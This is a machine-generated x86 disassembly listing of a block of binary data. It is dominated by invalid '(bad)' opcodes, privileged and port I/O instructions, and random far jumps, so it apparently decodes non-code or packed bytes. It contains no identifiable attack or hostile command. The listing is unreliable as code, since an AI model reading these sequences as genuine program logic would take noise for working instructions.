  41637f:	pop    es
  416380:	pop    ebx
  416381:	pop    eax
  416382:	and    BYTE PTR [edx],ch
  416384:	mov    edx,0xd51e57e7
  416389:	ret    
  41638a:	mov    dh,0x51
  41638c:	push   cs
  41638d:	inc    eax
  41638e:	stos   BYTE PTR es:[edi],al
  41638f:	stc    
  416390:	inc    ebx
  416391:	cmc    
  416392:	and    ecx,DWORD PTR [ebp-0x5b]
  416395:	rcl    DWORD PTR [ebx+0x170d2736],1
  41639b:	fwait
  41639c:	jbe    0x416408
  41639e:	inc    esp
  41639f:	lods   eax,DWORD PTR ds:[esi]
  4163a0:	retf   0x4da8
  4163a3:	mov    ss,WORD PTR [esi+0x5093a135]
  4163a9:	call   0x4a71c7ee
  4163ae:	repnz repz sbb ch,bh
  4163b2:	mov    BYTE PTR [esi],0x1e
  4163b5:	xchg   ebp,eax
  4163b6:	cmp    bh,al
  4163b8:	(bad)  
  4163b9:	pop    eax
  4163ba:	adc    eax,0x497ad459
  4163bf:	inc    ebx
  4163c0:	bound  ecx,QWORD PTR [esi]
  4163c2:	pop    esp
  4163c3:	pop    edi
  4163c4:	push   ss
  4163c5:	cwde   
  4163c6:	(bad)  
  4163c7:	sbb    eax,0xa7bcd67f
  4163cc:	mov    edx,esi
  4163ce:	pop    esi
  4163cf:	setl   BYTE PTR [eax+0x52]
  4163d3:	sar    BYTE PTR fs:[ebx-0x754bcb68],0xde
  4163db:	sti    
  4163dc:	mov    ah,0x5d
  4163de:	ja     0x416443
  4163e0:	xor    eax,0x676c1a68
  4163e5:	dec    ebx
  4163e6:	imul   BYTE PTR [esi+ebx*4-0x6b]
  4163ea:	sub    al,0xd2
  4163ec:	dec    esi
  4163ed:	les    ebp,FWORD PTR [ecx+0x685af1b7]
  4163f3:	in     eax,0x5b
  4163f5:	cmp    al,0x88
  4163f7:	je     0x4163fd
  4163f9:	cmp    BYTE PTR [edi+0x7e02be2f],ch
  4163ff:	repnz adc BYTE PTR ds:0xd4eaa912,al
  416406:	push   ds
  416407:	mov    edi,0xd0aa238b
  41640c:	out    dx,al
  41640d:	or     ebp,0xffffffe6
  416410:	xchg   edx,eax
	...
  416471:	add    BYTE PTR [eax],al
  416473:	add    bl,dh
  416475:	inc    ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	mov    bl,0xdf
  416482:	scas   eax,DWORD PTR es:[edi]
  416483:	das    
  416484:	pop    ecx
  416485:	jmp    0x416487
  416487:	add    BYTE PTR ds:0x1e000001,al
  41648d:	aad    0xef
  41648f:	cdq    
  416490:	mov    bh,ch
  416492:	xchg   ecx,eax
  416493:	aaa    
  416494:	jl     0x4164b9
  416496:	int    0x7b
  416498:	xchg   ebp,eax
  416499:	mov    edi,0x57cda4ea
  41649e:	aam    0xe6
  4164a0:	and    ah,BYTE PTR [ecx-0x266026c]
  4164a6:	add    ch,BYTE PTR [esi+esi*4+0x75ba8c40]
  4164ad:	stos   BYTE PTR es:[edi],al
  4164ae:	call   0xf70fd591
  4164b3:	sbb    esi,DWORD PTR [ebx]
  4164b5:	outs   dx,BYTE PTR ds:[esi]
  4164b6:	loop   0x4164ca
  4164b8:	pop    ecx
  4164b9:	into   
  4164ba:	dec    ebx
  4164bb:	inc    ebp
  4164bc:	fiadd  WORD PTR [edx-0x6a]
  4164bf:	cmp    BYTE PTR [edi],dh
  4164c1:	xchg   esi,eax
  4164c2:	inc    ecx
  4164c3:	cld    
  4164c4:	add    eax,0x1b442b9b
  4164c9:	retf   
  4164ca:	in     eax,0x29
  4164cc:	ror    BYTE PTR [edx+0x1d67e20b],1
  4164d2:	cwde   
  4164d3:	or     al,0xc7
  4164d5:	jno    0x416521
  4164d7:	cmp    ebx,DWORD PTR [edi]
  4164d9:	mov    bh,0xba
  4164db:	mov    cl,0x89
  4164dd:	push   ebp
  4164de:	cld    
  4164df:	mov    esi,ebp
  4164e1:	xchg   esi,eax
  4164e2:	and    BYTE PTR [edi],bl
  4164e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164e5:	hlt    
  4164e6:	or     al,0xb3
  4164e8:	popa   
  4164e9:	std    
  4164ea:	aam    0x88
  4164ec:	adc    BYTE PTR [ecx+0x1c9a8ec],dh
  4164f2:	cwde   
  4164f3:	push   ebp
  4164f4:	dec    ebx
  4164f5:	fld    DWORD PTR [ebx+0x2e16bf76]
  4164fb:	mov    edx,0x2abbd868
  416500:	mov    eax,0x6ef1075d
  416505:	push   esp
  416506:	mov    edx,0x8e9279d1
  41650b:	adc    BYTE PTR [edi],dh
  41650d:	and    DWORD PTR [eax-0x22db9fcf],edx
  416513:	stc    
  416514:	mov    edi,0x7d25cba9
  416519:	xor    eax,0x2d2774c9
  41651e:	or     cl,BYTE PTR [eax+0x62]
  416521:	push   0xffffffcb
  416523:	mov    al,0x1e
  416525:	(bad)  
  416526:	fstp   st(2)
  416528:	sahf   
  416529:	push   edx
  41652a:	pusha  
  41652b:	xlat   BYTE PTR ds:[ebx]
  41652c:	ror    DWORD PTR [edx],0xa7
  41652f:	jmp    0x26ac936c
  416534:	dec    ecx
  416535:	sub    BYTE PTR ds:0x7c034a52,dl
  41653b:	mov    al,0x56
  41653d:	jno    0x416506
  41653f:	pusha  
  416540:	ficom  WORD PTR [ebx+0x15]
  416543:	outs   dx,BYTE PTR ds:[esi]
  416544:	mov    ecx,0xc019aee7
  416549:	fnstenv [ebx]
  41654b:	xor    eax,0xa5322ab5
  416550:	mov    al,ds:0xc5486ad1
  416555:	and    BYTE PTR [ebx+ebx*8-0x6ca5699c],dl
  41655c:	imul   edi,DWORD PTR [eax+eax*2-0x47d2993f],0x2c
  416564:	cdq    
  416565:	add    al,0xf
  416567:	adc    DWORD PTR [eax+0x58ee9f4c],edi
  41656d:	mov    edi,0x14c9af3a
  416572:	mov    edx,0x4205c179
  416577:	stos   DWORD PTR es:[edi],eax
  416578:	ss xchg edi,eax
  41657a:	add    bl,BYTE PTR [eax+edi*4]
  41657d:	aaa    
  41657e:	add    ecx,DWORD PTR [ebp+0x7fb04ad3]
  416584:	inc    ebx
  416585:	jge    0x416600
  416587:	stc    
  416588:	in     eax,0xc5
  41658a:	add    eax,0x6463c77a
  41658f:	scas   al,BYTE PTR es:[edi]
  416590:	ja     0x416592
	...
  4165f2:	add    BYTE PTR [eax],al
  4165f4:	and    eax,0xfff32bd8
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x61b04354]
  416601:	mov    ds:0xec5e25,eax
  416607:	add    BYTE PTR ds:0xb8000001,al
  41660d:	clc    
  41660e:	leave  
  41660f:	inc    esi
  416610:	fsubr  st,st(4)
  416612:	and    al,0xfe
  416614:	lods   al,BYTE PTR ds:[esi]
  416615:	daa    
  416616:	mov    dh,0xab
  416618:	fst    QWORD PTR [edx]
  41661a:	mov    dh,0xa3
  41661c:	(bad)  
  41661d:	mov    ds:0xdca0bffa,eax
  416622:	add    BYTE PTR [edi-0x2efdc337],dh
  416628:	xlat   BYTE PTR ds:[ebx]
  416629:	or     esp,ebx
  41662b:	xchg   ebx,eax
  41662c:	mov    ss,WORD PTR [edx+eiz*2+0x2a7fe7d7]
  416633:	mov    ds,WORD PTR [ecx+0x6]
  416636:	xor    eax,0xce57594a
  41663b:	inc    ecx
  41663c:	cmp    al,0xae
  41663e:	jmp    0xbffce6c8
  416643:	add    BYTE PTR [edi-0x64],al
  416646:	mul    BYTE PTR [eax-0x26]
  416649:	pusha  
  41664a:	cmp    al,0x76
  41664c:	xchg   esp,eax
  41664d:	push   0xd4d8a74c
  416652:	adc    BYTE PTR [eax-0x2efb93b7],ch
  416658:	push   ss
  416659:	inc    esp
  41665a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41665b:	test   al,0xac
  41665d:	pop    eax
  41665e:	jle    0x416662
  416660:	and    BYTE PTR [eax],al
  416662:	mov    al,ds:0xea8f442c
  416667:	fs inc ecx
  416669:	push   cs
  41666a:	fldln2 
  41666c:	sbb    ch,bh
  41666e:	ss pop eax
  416670:	xor    BYTE PTR [ecx-0x1f],ah
  416673:	cmp    al,BYTE PTR [esi]
  416675:	std    
  416676:	scas   al,BYTE PTR es:[edi]
  416677:	and    eax,0x9ced5249
  41667c:	sbb    WORD PTR [edx+esi*8-0x63],0xffdb
  416682:	or     edx,ebx
  416684:	cwde   
  416685:	ja     0x4166a5
  416687:	pcmpeqd mm5,QWORD PTR [ebx]
  41668a:	test   al,0x58
  41668c:	mov    al,ds:0xdab22d1a
  416691:	sbb    cl,BYTE PTR [edi+0x132a9a30]
  416697:	adc    DWORD PTR [ebp+0xa],0x9179a602
  41669e:	gs xor al,0xd5
  4166a1:	push   esp
  4166a2:	adc    ch,BYTE PTR [eax+0x26]
  4166a5:	mov    esi,DWORD PTR [ecx+0x4fd218d4]
  4166ab:	out    dx,eax
  4166ac:	add    BYTE PTR [esi+0x6c],dh
  4166af:	fucomi st,st(3)
  4166b1:	or     DWORD PTR fs:[ecx+0x78],ecx
  4166b5:	sahf   
  4166b6:	cwde   
  4166b7:	test   esi,edi
  4166b9:	dec    ebx
  4166ba:	add    ebp,DWORD PTR ds:0x807cf9a9
  4166c0:	or     eax,0x9d08f2e6
  4166c5:	nop
  4166c6:	out    dx,al
  4166c7:	inc    edi
  4166c8:	stos   DWORD PTR es:[edi],eax
  4166c9:	xor    al,0x49
  4166cb:	or     BYTE PTR [edi+0x4a46d7c3],0x35
  4166d2:	push   0x49
  4166d4:	fdiv   st,st(1)
  4166d6:	test   al,0x85
  4166d8:	mov    dh,dh
  4166da:	repz dec edx
  4166dc:	sub    dh,bl
  4166de:	jno    0x416758
  4166e0:	xchg   edi,eax
  4166e1:	nop
  4166e2:	mov    ebx,0xd234684b
  4166e7:	jno    0x416686
  4166e9:	inc    BYTE PTR [eax-0x61820fe2]
  4166ef:	lods   eax,DWORD PTR ds:[esi]
  4166f0:	invlpg BYTE PTR [esp+ebx*1-0x60]
  4166f5:	inc    ecx
  4166f6:	jb     0x41671a
  4166f8:	in     al,0xc1
  4166fa:	inc    ecx
  4166fb:	iret   
  4166fc:	rcr    DWORD PTR cs:[edx+0xc4b3f57],0x9a
  416704:	xchg   ebp,eax
  416705:	jmp    0xd375:0xf7595a4f
  41670c:	push   ss
  41670d:	dec    edx
  41670e:	shl    BYTE PTR [esi+0x15],0x0
	...
  416772:	add    BYTE PTR [eax],al
  416774:	(bad)  
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	jp     0x4167e5
  416782:	or     al,0x14
  416784:	arpl   bp,bp
  416786:	add    BYTE PTR [eax],al
  416788:	add    eax,0x7000001
  41678d:	into   
  41678e:	sub    al,0xbe
  416790:	repz aad 0x9a
  416793:	push   ebx
  416794:	jp     0x416724
  416796:	mov    eax,ds:0x565d39c
  41679b:	inc    eax
  41679c:	cmp    ebp,DWORD PTR [edx+edx*4-0x7]
  4167a0:	test   ah,bh
  4167a2:	out    dx,al
  4167a3:	jno    0x41672d
  4167a5:	sub    edi,DWORD PTR [esi+esi*1+0x30]
  4167a9:	pop    ebx
  4167aa:	push   edx
  4167ab:	mov    dl,0x74
  4167ad:	mov    esi,0x345dbaa3
  4167b2:	(bad)
  4167b6:	and    ah,0x55
  4167b9:	jo     0x41677d
  4167bb:	inc    esp
  4167bc:	mov    ds:0xa77eafbd,al
  4167c1:	push   ebx
  4167c2:	jl     0x416817
  4167c4:	sbb    DWORD PTR [ebx],esp
  4167c6:	jno    0x4167c9
  4167c8:	adc    eax,0xea1f46ed
  4167cd:	dec    esp
  4167ce:	out    0x44,eax
  4167d0:	or     cl,BYTE PTR [edx+0x8]
  4167d3:	or     eax,0x11e2a4fa
  4167d8:	or     eax,0xbe8fc0ac
  4167dd:	rcl    DWORD PTR [ebx-0x71b8389f],cl
  4167e3:	ss ins DWORD PTR es:[edi],dx
  4167e5:	scas   al,BYTE PTR es:[edi]
  4167e6:	mov    ds:0x3c24f6c0,eax
  4167eb:	push   edi
  4167ec:	jle    0x41685d
  4167ee:	jno    0x416817
  4167f0:	or     al,0x88
  4167f2:	nop
  4167f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167f4:	test   DWORD PTR [ecx],ebx
  4167f6:	lods   al,BYTE PTR ds:[esi]
  4167f7:	inc    ecx
  4167f8:	out    dx,al
  4167f9:	ret    0xdd85
  4167fc:	loopne 0x4167cb
  4167fe:	(bad)  
  4167ff:	iret   
  416800:	jl     0x4167d7
  416802:	ins    DWORD PTR es:[edi],dx
  416803:	ds jbe 0x41681c
  416806:	mov    WORD PTR [ebp+0x7f],es
  416809:	mov    al,0xcd
  41680b:	int3   
  41680c:	(bad)  
  41680d:	fsubr  DWORD PTR [esi+0xb]
  416810:	dec    esp
  416811:	jns    0x41680e
  416813:	mov    ecx,DWORD PTR [eax-0x6b25740f]
  416819:	adc    bh,BYTE PTR [ebx+0x1f9a2127]
  41681f:	pop    ds
  416820:	and    al,0xd7
  416822:	repz dec esi
  416824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416825:	adc    DWORD PTR [eax-0x6f],0xffffffb7
  416829:	lea    esp,[ebp-0x24]
  41682c:	adc    al,0xe0
  41682e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41682f:	inc    edi
  416830:	mov    cl,0xc6
  416832:	mov    DWORD PTR [ecx-0xc],edx
  416835:	jmp    0x4167eb
  416837:	add    al,0xd8
  416839:	aad    0x90
  41683b:	mov    esi,0xaeeac7d1
  416840:	hlt    
  416841:	pop    eax
  416842:	das    
  416843:	fst    DWORD PTR [ecx]
  416845:	push   es
  416846:	pmaxub mm2,QWORD PTR [esi]
  416849:	lock push cs
  41684b:	or     al,0xd3
  41684d:	das    
  41684e:	mov    dl,0x74
  416850:	mov    ds:0xb6c35126,eax
  416855:	xchg   edi,eax
  416856:	sbb    eax,0xb9f08691
  41685b:	inc    esp
  41685c:	push   cs
  41685d:	and    bl,BYTE PTR [esi]
  41685f:	pop    ss
  416860:	pop    edi
  416861:	stos   BYTE PTR es:[edi],al
  416862:	test   al,0x77
  416864:	adc    BYTE PTR [eax+0x1565a2a0],dl
  41686a:	div    DWORD PTR [edi]
  41686c:	xchg   DWORD PTR [esi+0x4b4e8df1],ebx
  416872:	and    bl,ah
  416874:	push   es
  416875:	mov    eax,0xfaef2b2c
  41687a:	es pop esp
  41687c:	sbb    DWORD PTR [ecx+0x1add76fd],ebx
  416882:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416883:	out    0xf,eax
  416885:	imul   esp,DWORD PTR [edx-0xf],0x45a727a0
  41688c:	jmp    0x0:0x7acd762
	...
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x35abed1a
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    dl,al
  41690d:	repz shl DWORD PTR cs:[edx],cl
  416911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416912:	push   esi
  416913:	jp     0x41697c
  416915:	ret    
  416916:	icebp  
  416917:	sbb    al,0x89
  416919:	fidiv  WORD PTR [ebx-0x32bf34c7]
  41691f:	jmp    0x4168d6
  416921:	pop    esi
  416922:	pop    eax
  416923:	inc    esp
  416924:	lds    eax,FWORD PTR [esi+0x2b]
  416927:	clc    
  416928:	loope  0x4168b1
  41692a:	push   cs
  41692b:	ds jmp 0x68cc:0x4fd6fd4e
  416933:	jmp    0xdb:0xb4e8dfa7
  41693a:	sahf   
  41693b:	ror    DWORD PTR [ebp+0x58651a42],cl
  416941:	cmp    eax,0xc4872b37
  416946:	int3   
  416947:	mov    ebx,DWORD PTR [eax+0x62ec752a]
  41694d:	add    DWORD PTR [edi-0x57],edx
  416950:	dec    edi
  416951:	jmp    0x9bcb:0x187f06a3
  416958:	jb     0x416939
  41695a:	xchg   BYTE PTR [ebx],ch
  41695c:	stos   DWORD PTR es:[edi],eax
  41695d:	push   0xbd517f95
  416962:	xchg   BYTE PTR [edx+0x5e],ch
  416965:	rcr    BYTE PTR [eax-0x29],0x21
  416969:	and    dl,BYTE PTR [edx-0x1]
  41696c:	and    edx,DWORD PTR [esi]
  41696e:	jl     0x4169d6
  416970:	adc    DWORD PTR [edx+0x34],esi
  416973:	mov    ch,0x11
  416975:	cli    
  416976:	ret    
  416977:	js     0x4169e6
  416979:	out    0x22,al
  41697b:	jmp    0x96e5:0x1825c364
  416982:	inc    esi
  416983:	dec    edi
  416984:	xor    ch,ah
  416986:	mov    al,0x2f
  416988:	sbb    al,0xb0
  41698a:	pusha  
  41698b:	lods   eax,DWORD PTR ds:[esi]
  41698c:	dec    esi
  41698d:	ret    
  41698e:	rcl    BYTE PTR [ecx+eiz*8+0x1e],0xcc
  416993:	fs push eax
  416995:	pop    ss
  416996:	adc    ebp,eax
  416998:	jecxz  0x41695f
  41699a:	add    bh,BYTE PTR [ebx+eiz*8+0x5aa82278]
  4169a1:	mov    bh,0x8b
  4169a3:	shl    BYTE PTR [ebx+esi*8-0x567b3703],0xb7
  4169ab:	push   ebp
  4169ac:	dec    dh
  4169ae:	mov    bh,0x6f
  4169b0:	inc    edi
  4169b1:	lea    esp,[eax]
  4169b3:	in     al,0x30
  4169b5:	fsub   QWORD PTR [eax]
  4169b7:	dec    BYTE PTR [ebx]
  4169b9:	inc    ebp
  4169ba:	dec    ebx
  4169bb:	push   0xb8beb186
  4169c0:	js     0x416952
  4169c2:	jmp    0xd39bee2e
  4169c7:	outs   dx,BYTE PTR ds:[esi]
  4169c8:	and    BYTE PTR [edi+0x662290e9],dh
  4169ce:	rcl    BYTE PTR [esp+eax*8-0x48288ee1],cl
  4169d5:	sbb    esp,esi
  4169d7:	sub    DWORD PTR [eax+0x644ee233],0x8a917ef
  4169e1:	mov    DWORD PTR [esi+0x61f80afe],edi
  4169e7:	fwait
  4169e8:	rol    DWORD PTR [eax+0x2d],cl
  4169eb:	dec    edi
  4169ec:	out    dx,eax
  4169ed:	(bad)  
  4169ee:	into   
  4169ef:	pop    ss
  4169f0:	ret    0x3393
  4169f3:	sub    BYTE PTR [ecx+0xd],dl
  4169f6:	pop    ds
  4169f7:	in     eax,0xc4
  4169f9:	mov    edx,0x852b9f6c
  4169fe:	test   BYTE PTR [ecx],0x0
  416a01:	enter  0x14a2,0x17
  416a05:	pop    ecx
  416a07:	sar    DWORD PTR [ecx],0xa1
  416a0a:	lds    esp,FWORD PTR [ebp-0x253c7f6c]
  416a10:	fwait
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x53f40ba3
  416a82:	out    dx,al
  416a83:	xor    ch,BYTE PTR [ebp-0x11]
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    eax,0xa2000001
  416a8d:	add    dl,BYTE PTR [edi+ecx*8+0xb]
  416a91:	imul   edx,esp,0xd1fed017
  416a97:	cmp    al,0x60
  416a99:	and    BYTE PTR [esi+0x1d],0xa
  416a9d:	dec    edx
  416a9e:	icebp  
  416a9f:	pusha  
  416aa0:	int3   
  416aa1:	adc    BYTE PTR es:[edi],ch
  416aa4:	dec    esi
  416aa5:	data16 fisubr DWORD PTR [ecx]
  416aa8:	clc    
  416aa9:	mov    dh,0x5d
  416aab:	rcl    BYTE PTR [eax+ecx*4],cl
  416aae:	push   es
  416aaf:	js     0x416a3d
  416ab1:	or     eax,0x1c1a3261
  416ab6:	test   DWORD PTR [edx+0x2846387f],0xa5e5257e
  416ac0:	sub    ebx,DWORD PTR [edi-0x2b]
  416ac3:	jge    0x416b10
  416ac5:	sahf   
  416ac6:	popf   
  416ac7:	or     esp,eax
  416ac9:	cmp    al,0x39
  416acb:	call   0x5117:0x1f3f280c
  416ad2:	gs xchg edi,eax
  416ad4:	jae    0x416b45
  416ad6:	mov    ebx,0x92e13296
  416adb:	ja     0x416ac5
  416add:	(bad)  
  416ade:	retf   0x977a
  416ae1:	fwait
  416ae2:	imul   di,WORD PTR [eax],0x6
  416ae6:	fs push ds
  416ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ae9:	icebp  
  416aea:	fldcw  WORD PTR [edi-0x1c94f904]
  416af0:	sbb    eax,0xbbea49bc
  416af5:	cld    
  416af6:	xor    eax,0x9837e7e3
  416afb:	jb     0x416afc
  416afd:	mov    bl,0x7c
  416aff:	popf   
  416b00:	inc    ebp
  416b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b02:	xor    bl,al
  416b04:	shl    BYTE PTR ds:0x8d8ecc86,0xc1
  416b0b:	pop    edx
  416b0c:	inc    ebx
  416b0d:	inc    ebp
  416b0e:	pushf  
  416b0f:	push   0x89eacdc1
  416b14:	ds gs addr16 adc ch,cl
  416b19:	or     esi,DWORD PTR [edi+0x1549e58c]
  416b1f:	inc    ecx
  416b20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b21:	or     dh,BYTE PTR [edx]
  416b23:	dec    edx
  416b24:	adc    BYTE PTR [edx],cl
  416b26:	mov    ebp,0x4319b5c
  416b2b:	xor    dh,bl
  416b2d:	xor    eax,0x86d9ce12
  416b32:	int3   
  416b33:	cmp    dh,al
  416b35:	outs   dx,DWORD PTR ds:[esi]
  416b36:	push   0xffffffde
  416b38:	ins    BYTE PTR es:[edi],dx
  416b39:	xchg   ebx,eax
  416b3a:	xchg   edx,eax
  416b3b:	loop   0x416b85
  416b3d:	(bad)  
  416b3e:	pop    ebp
  416b3f:	or     BYTE PTR [ebp+ecx*1+0x336a8ea1],ch
  416b46:	(bad)  
  416b47:	pop    edx
  416b48:	cmc    
  416b49:	pusha  
  416b4a:	in     al,dx
  416b4b:	dec    eax
  416b4c:	push   ds
  416b4d:	nop
  416b4e:	cmp    DWORD PTR [ecx-0x2a],ebx
  416b51:	adc    eax,DWORD PTR [ecx]
  416b53:	push   esi
  416b54:	adc    cl,dl
  416b56:	or     DWORD PTR ds:[ebp-0x31],0xffffffec
  416b5b:	jmp    0xbcf8:0x38d93938
  416b62:	loopne 0x416b9f
  416b64:	add    bh,BYTE PTR [ebx-0x3]
  416b67:	xor    ebx,DWORD PTR [ecx+0x394f96b3]
  416b6d:	dec    edx
  416b6e:	adc    al,0xa0
  416b70:	jne    0x416b75
  416b72:	les    eax,FWORD PTR [ebx-0x72d95faa]
  416b78:	add    DWORD PTR [ecx],esp
  416b7a:	cld    
  416b7b:	sub    eax,0xf7f3c9e5
  416b80:	pop    ebp
  416b81:	aaa    
  416b82:	arpl   bx,di
  416b84:	pop    es
  416b85:	mov    ecx,0x30013a89
  416b8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b8b:	mov    ebp,0x77e56c26
  416b90:	pop    esp
	...
  416bf1:	add    BYTE PTR [eax],al
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0xc15b70a9
  416c01:	sub    DWORD PTR [eax+0xf07256],esp
  416c07:	add    BYTE PTR ds:0xb9000001,al
  416c0d:	popf   
  416c0e:	mov    edi,0xe65b9272
  416c13:	(bad)  
  416c14:	sub    ecx,ebp
  416c16:	shl    edi,1
  416c18:	mov    esp,0x904cb7e4
  416c1d:	or     BYTE PTR [esi-0x5],al
  416c20:	ror    DWORD PTR [edx+0x41],1
  416c23:	lods   eax,DWORD PTR ds:[esi]
  416c24:	cmp    eax,0x90afc799
  416c29:	out    dx,al
  416c2a:	jp     0x416cab
  416c2c:	lods   eax,DWORD PTR ds:[esi]
  416c2d:	cmp    ch,0xe2
  416c30:	lods   eax,DWORD PTR ds:[esi]
  416c31:	rol    DWORD PTR [ebx],cl
  416c33:	and    DWORD PTR [eax+0x2],0x52e07b1
  416c3a:	mov    eax,0xe727976c
  416c3f:	add    eax,0x578a90d
  416c44:	nop
  416c45:	xchg   esi,eax
  416c46:	sbb    DWORD PTR [ecx-0x29d4d667],esp
  416c4c:	or     al,0xa9
  416c4e:	jae    0x416cb3
  416c50:	jle    0x416c9b
  416c52:	rol    BYTE PTR [edi-0x2c],cl
  416c55:	pop    esp
  416c56:	mov    al,0x9a
  416c58:	shr    BYTE PTR [ecx],cl
  416c5a:	test   eax,edi
  416c5c:	push   0xffffffdf
  416c5e:	mov    cl,0xaf
  416c60:	mov    BYTE PTR [edi],dh
  416c62:	mov    bl,0x2d
  416c64:	popa   
  416c65:	jp     0x416c53
  416c67:	outs   dx,DWORD PTR ds:[esi]
  416c68:	cmp    DWORD PTR [eax],eax
  416c6a:	mov    edx,0xd2a3815f
  416c6f:	repnz and eax,0x4770135b
  416c75:	xchg   edi,eax
  416c76:	(bad)  
  416c78:	shr    dl,cl
  416c7a:	les    esp,FWORD PTR [edi-0x55]
  416c7d:	add    eax,DWORD PTR [ebx-0x4e011526]
  416c83:	dec    esp
  416c84:	data16 add al,0x58
  416c87:	into   
  416c88:	shl    ah,cl
  416c8a:	imul   ebp,ecx,0xfffffff8
  416c8d:	mul    DWORD PTR [esi-0x2c95c1ec]
  416c93:	setge  BYTE PTR [eax-0x41]
  416c97:	aad    0x4e
  416c99:	shl    DWORD PTR [edx],0xa0
  416c9c:	aam    0xc8
  416c9e:	adc    DWORD PTR fs:[edi+0x2e147e0c],0x8
  416ca6:	lods   eax,DWORD PTR ds:[esi]
  416ca7:	cmp    eax,0xb8429725
  416cac:	push   edi
  416cad:	pop    esp
  416cae:	jge    0x416cff
  416cb0:	scas   al,BYTE PTR es:[edi]
  416cb1:	call   0x4e58:0x65e0c8b6
  416cb8:	xchg   DWORD PTR [edi-0x2],edi
  416cbb:	and    ebx,DWORD PTR [ebx]
  416cbd:	mov    DWORD PTR [edi-0x41cd86e3],ecx
  416cc3:	pop    edx
  416cc4:	dec    ecx
  416cc5:	out    0x47,al
  416cc7:	ror    BYTE PTR ds:0x99e28c14,cl
  416ccd:	adc    cl,bl
  416ccf:	es cld 
  416cd1:	pushf  
  416cd2:	sbb    ebp,DWORD PTR [esi-0xabde305]
  416cd8:	out    0x91,al
  416cda:	pop    ecx
  416cdb:	sbb    DWORD PTR [esi-0x4d768062],esp
  416ce1:	mov    DWORD PTR [ecx+edi*2],eax
  416ce4:	fwait
  416ce5:	mov    al,ds:0x89783c0b
  416cea:	neg    DWORD PTR [eax-0x23]
  416ced:	outs   dx,BYTE PTR ds:[esi]
  416cee:	lods   eax,DWORD PTR ds:[esi]
  416cef:	sbb    eax,0x326a64d3
  416cf4:	sub    BYTE PTR ds:0xdf8c0902,cl
  416cfa:	stos   BYTE PTR es:[edi],al
  416cfb:	sub    edi,esi
  416cfd:	sbb    BYTE PTR [eax+0x52],bh
  416d00:	jg     0x416d11
  416d02:	push   esi
  416d03:	mov    esp,0xe1cdd6b6
  416d08:	sub    ebp,ebx
  416d0a:	ins    DWORD PTR es:[edi],dx
  416d0b:	dec    esi
  416d0c:	mov    ecx,0x4ab00562
	...
  416d71:	add    BYTE PTR [eax],al
  416d73:	add    BYTE PTR [ecx],ah
  416d75:	xchg   ebx,eax
  416d76:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	mov    edi,0x776336c4
  416d85:	icebp  
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    eax,0xe1000001
  416d8d:	sub    al,0x95
  416d8f:	inc    ecx
  416d90:	scas   eax,DWORD PTR es:[edi]
  416d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d93:	retf   
  416d94:	fcomi  st,st(2)
  416d96:	inc    esi
  416d97:	cli    
  416d98:	icebp  
  416d99:	mov    BYTE PTR [esi+0x28],dl
  416d9c:	dec    ebp
  416d9d:	jmp    0x9539:0x901fb3f9
  416da4:	je     0x416da2
  416da6:	inc    esp
  416da8:	repnz push ebp
  416daa:	into   
  416dab:	enter  0xbc65,0xd3
  416daf:	adc    BYTE PTR [edx+edi*1],ah
  416db2:	jl     0x416ddc
  416db4:	in     eax,dx
  416db5:	stos   DWORD PTR es:[edi],eax
  416db6:	(bad)  
  416db7:	jno    0x416dfb
  416db9:	cmp    al,0xac
  416dbb:	or     edx,DWORD PTR [ebx-0x59]
  416dbe:	gs xor al,0x87
  416dc1:	push   eax
  416dc2:	adc    al,0x7d
  416dc4:	jmp    0x125e:0xd1f50c9f
  416dcb:	add    dl,dl
  416dcd:	push   0x2a
  416dcf:	xor    al,0x39
  416dd1:	cwde   
  416dd2:	add    dh,BYTE PTR [esi+0x5c]
  416dd5:	push   es
  416dd6:	mov    ah,0x7
  416dd8:	mov    dh,0xc3
  416dda:	or     ch,dh
  416ddc:	(bad)  
  416dde:	mov    BYTE PTR [edx+0x2a],cl
  416de1:	mov    dh,0x19
  416de3:	ja     0x416e49
  416de5:	or     eax,DWORD PTR [ecx+ebp*4+0x66ea3c3f]
  416dec:	clc    
  416ded:	jmp    0x416dd5
  416def:	fld    st(1)
  416df1:	mov    ah,0xd
  416df3:	cwde   
  416df4:	push   cs
  416df5:	push   ecx
  416df6:	sbb    esi,0x347746b2
  416dfc:	sub    ecx,0xffffff97
  416dff:	push   ds
